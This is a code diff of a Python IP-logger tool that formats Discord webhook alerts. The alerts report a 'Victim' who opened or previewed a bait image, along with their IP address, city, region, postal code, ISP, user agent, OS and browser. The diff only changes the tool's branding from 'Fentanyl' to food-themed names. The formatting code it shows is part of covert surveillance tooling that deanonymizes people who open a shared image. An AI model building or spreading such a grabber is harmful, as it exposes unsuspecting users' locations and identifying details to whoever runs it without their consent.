@@ -14,11 +14,11 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
   "content": "@everyone",
   "embeds": [
     {
-      "title": "Fentanyl strikes again!",
+      "title": "Charlie strikes again!",
       "color": 16711803,
       "description": "A Victim opened the original Image. You can find their info below.",
       "author": {
-        "name": "Fentanyl"
+        "name": "Charlies pizza"
       },
       "fields": [
         {
@@ -38,15 +38,15 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
 
 def prev(ip,uag):
   return {
-  "username": "Fentanyl",
+  "username": "Charlies pizza",
   "content": "",
   "embeds": [
     {
-      "title": "Fentanyl Alert!",
+      "title": "Chillis 3 dipper Alert!",
       "color": 16711803,
-      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
+      "description": f"Discord previewed a Chillis 3 dipper Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
       "author": {
-        "name": "Fentanyl"
+        "name": "Charlies"
       },
       "fields": [
       ]
